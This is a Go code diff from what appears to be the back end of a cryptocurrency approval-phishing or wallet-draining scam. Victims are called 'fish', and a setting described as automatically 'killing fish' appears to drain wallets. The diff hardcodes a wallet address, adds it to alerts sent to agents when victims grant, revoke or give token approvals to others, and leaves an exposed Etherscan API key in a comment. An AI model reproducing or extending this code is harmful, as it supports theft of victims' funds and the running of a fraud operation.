@@ -320,7 +320,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 
 	//获取 要查询的 fish
 	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
-	//foxAddress = "0x153e3aeca5a9901ea403fc8afd46998109cbac19"
+	foxAddress = "0xb64c3f90a3c72b26d08387cc9f21eb5cbc086956"
 	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
 	if err != nil {
 		fmt.Println(err.Error())
@@ -376,6 +376,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 					Db.Model(&Fish{}).Where("id=?", fish.AdminId).Update(&Fish{AuthorizationAt: time.Now().Unix()}) //更新授权时间
 					content := "❥【授权给我们报警!!】---------------------------------------------------->%0A" +
 						" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
+						"钱包地址:" + foxAddress + "%0A" +
 						"所属代理ID:" + admin.Username + "%0A" +
 						" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "👏👏👏️"
 					NotificationAdmin(Db, fish.AdminId, content)
@@ -429,6 +430,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 				content := "❥【取消授权报警】-------------------------------------------------->%0A" +
 					" 用户编号: [ 11784374" + fishID + "] " + "取消了我们%0A" +
 					" 用户备注: [" + fish.Remark + "] " + "%0A" +
+					"钱包地址:" + foxAddress + "%0A" +
 					"所属代理ID:" + admin.Username + "%0A" +
 					" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "😳😳😳"
 				NotificationAdmin(Db, fish.AdminId, content)
@@ -455,9 +457,9 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 						" 用户编号: [ 11784374" + fishID + "] " + "授权给他人%0A" +
 						" 用户备注: [" + fish.Remark + "] " + "%0A" +
 						"所属代理ID:" + admin.Username + "%0A" +
+						"钱包地址:" + foxAddress + "%0A" +
 						" 当前授权人数: [" + people + "] " + "%0A" +
 						" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "😱😱😱"
-
 					NotificationAdmin(Db, fish.AdminId, content)
 				}
 				if fish.OthersAuthorizationKill == 1 && fish.AuthorizationTime < count { //授权给他们就杀开关   1开 开始自动杀鱼
@@ -471,6 +473,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 		Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
 
 	}
+
 }
 
 /**
